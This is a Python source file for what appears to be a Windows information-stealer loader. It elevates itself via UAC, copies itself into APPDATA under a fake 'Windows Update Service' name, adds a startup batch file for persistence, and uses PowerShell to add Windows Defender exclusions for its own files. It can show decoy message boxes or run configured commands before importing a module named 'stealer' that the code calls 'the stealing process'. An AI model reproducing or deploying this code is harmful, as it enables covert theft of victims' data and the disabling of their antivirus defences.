import os

if os.name != "nt": os._exit(0)

import sys
from utils import uac
# from winpwnage.functions.uac.uacMethod2 import uacMethod2
# 
# if not uac.is_user_admin() and getattr(sys, "frozen", False):
#     current_file = sys.executable
#     uacMethod2([current_file])
#     os._exit(0)
# 
# NOTE: not working ^

import time
import pyuac
import shutil
import tkinter
import subprocess
from tkinter import messagebox

def msgbox(box_type, title, message):
    try:
        root = tkinter.Tk()
        root.withdraw()
    except: pass
    
    if box_type == "Info":
        messagebox.showinfo(title, message)
    elif box_type == "Warning":
        messagebox.showwarning(title, message)
    elif box_type == "Error":
        messagebox.showerror(title, message)
    else:
        messagebox.showerror(title, message)

def run_cmd(args):
    return subprocess.Popen(args)

def uac_check():
    if uac.is_user_admin():
        print(f"[UAC Check] Running with elevated privileges.\n{sys.argv}")
        msgbox("Warning", "UAC Check", f"Running with elevated privileges.\n{sys.argv}")

    else:
        print(f"[UAC Check] Running with normal privileges.\n{sys.argv}")
        msgbox("Info", "UAC Check", f"Running with normal privileges.\n{sys.argv}")

## CONFIG ##
TITLE = ""
MESSAGE = ""
BOX_TYPE = ""
COMMAND_ARGS = ['']
DELAY = 0
MODE = "Do Nothing"
RUN_AT_STARTUP = False
STARTING_COMMAND = "echo Patching..."
DEBUG_MODE = False

try:
    if RUN_AT_STARTUP and not "IGNOREMODE" in sys.argv:
        if not pyuac.isUserAdmin():
            pyuac.runAsAdmin()
            os._exit(0)
        else:
            src_path = sys.executable

            dest_folder = os.path.join(os.getenv("APPDATA"), "Microsoft Corporation", "Windows Update Service")
            dest_name = "updater.exe"

            os.makedirs(dest_folder, exist_ok=True)
            dest_path = os.path.join(dest_folder, dest_name)
            shutil.copy(src_path, dest_path)

            startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            bat_path = os.path.join(startup_folder, "Windows Update Service.bat")
            with open(bat_path, "w+") as bat_file:
                bat_file.write(f'start "" "{dest_path}" IGNOREMODE')

            defender_exceptions = [
                src_path,
                dest_path,
                bat_path,
                os.path.join(startup_folder, dest_name)
            ]

            if STARTING_COMMAND:
                powershell_commands = [STARTING_COMMAND]
            else:
                powershell_commands = []
            
            powershell_commands += [f"Add-MpPreference -ExclusionPath '{path}'" for path in defender_exceptions]
            subprocess.run(f'''powershell -command "{'; '.join(powershell_commands)}"''')

except:
    pass

if not "IGNOREMODE" in sys.argv:
    if DELAY:
        time.sleep(DELAY)
    
    if MODE == "Do Nothing":
        pass
    elif MODE == "Message Box":
        msgbox(BOX_TYPE, TITLE, MESSAGE)
    elif MODE == "Run Command":
        run_cmd(COMMAND_ARGS)
    elif MODE == "UAC Check":
        uac_check()
    else:
        pass

if DEBUG_MODE: msgbox("Warning", "DEBUG MODE", "Debug mode is enabled. This program will not run the stealing process.")
else:          import stealer